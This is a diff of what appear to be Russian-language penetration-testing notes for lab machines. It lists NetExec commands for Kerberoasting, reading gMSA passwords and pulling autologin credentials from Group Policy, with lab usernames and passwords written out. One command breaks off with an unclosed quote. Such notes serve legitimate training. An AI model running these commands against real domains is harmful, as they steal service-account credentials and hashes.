@@ -96,7 +96,9 @@
 		nxc ldap -u david.jjackson -p 'pN8kQmn6b86!1234@' -d mirage.htb -k --kerberoasting kerberoastables.txt dc01.mirage.htb
 		# Перечисление учетных записей с привилегиями gMSA
 		nxc winrm dc01.inlanefreight.htb -u robert -p Inlanefreight01! -X "Get-ADServiceAccount -Filter * -Properties 
-		(чтение GMSA)  nxc ldap dc01.mirage.htb -u javier.mmarshall -p 'Password123' -k --gmsa 
+
+
+(чтение GMSA)  nxc ldap dc01.mirage.htb -u javier.mmarshall -p 'Password123' -k --gmsa 
 		
 		(Поиск учетных записей в объектах групповой политики)
 		nxc smb <IP-адрес> -u <имя_пользователя> -p <пароль> -M gpp_autologin 
